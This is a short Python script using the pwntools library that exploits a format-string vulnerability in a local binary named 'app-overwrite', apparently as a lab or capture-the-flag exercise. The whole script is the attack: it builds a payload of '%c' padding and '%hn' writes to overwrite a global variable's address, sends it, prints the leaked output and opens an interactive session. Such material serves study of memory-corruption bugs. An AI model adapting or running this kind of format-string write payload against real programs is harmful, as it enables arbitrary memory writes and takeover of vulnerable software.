from pwn import * 
def fora(): 
    elf = ELF('./app-overwrite')
    sh = process('./app-overwrite') 
    b_addr =  elf.symbols['b'] # address of b 
    
    # format string – change to your answer 
    payload = b'%4660c%14$hn%17476c%13$hnaaa' + p32(b_addr) + p32(b_addr + 2)
    sh.sendline(payload) 
    res = sh.recv().split(b'\n')
    print('Leaked demo:', res[0])
    print('Format string leak:', res[1])
    print('Output:', b'\n'.join(res[2:]).decode('utf-8')) 
    sh.interactive() 
fora() 